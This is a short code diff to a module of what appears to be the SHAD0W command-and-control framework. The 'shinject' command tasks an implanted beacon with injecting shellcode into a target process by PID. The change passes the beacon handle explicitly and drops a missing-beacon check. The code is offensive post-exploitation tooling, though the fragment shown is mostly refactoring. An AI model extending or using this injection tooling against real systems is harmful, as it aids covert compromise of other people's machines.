@@ -16,11 +16,19 @@ from lib.basecommand import BaseCommand
 
 DLLINJECT_EXEC_ID = 0x5000
 
+# beacon to exec command on
+current_beacon = None
+
+def shinject_callback(shad0w, data):
+    # wont be hit
+    return
 
 class ShinjectCommand(BaseCommand):
 
-    def __init__(self, args):
+    def __init__(self, args, beacon):
         BaseCommand.__init__(self, "shinject", args)
+
+        self.beacon = beacon
 
     def parse_parameters(self):
         self.parser.add_argument("-p", "--pid", required=True, help="PID to migrate to")
@@ -45,7 +53,7 @@ shinject -p 8725 -f shellcode.bin
         inject_info = build_inject_info(self.args, rcode)
 
         # tell the beacon to execute the dll
-        shad0w.beacons[shad0w.current_beacon]["task"] = (DLLINJECT_EXEC_ID, inject_info)
+        shad0w.beacons[self.beacon]["task"] = (DLLINJECT_EXEC_ID, inject_info)
         pass
 
 
@@ -131,14 +139,13 @@ def get_file_data(filename):
     return data
 
 
-def main(shad0w, args):
+def main(shad0w, args, beacon):
+    global current_beacon
 
-    # check we actually have a beacon
-    if shad0w.current_beacon is None:
-        shad0w.debug.log("ERROR: No active beacon", log=True)
-        return
+    # make beacon global
+    current_beacon = beacon
 
-    cmd = ShinjectCommand(args)
+    cmd = ShinjectCommand(args, beacon)
     if cmd.parse() is True:
         cmd.run(shad0w)
 
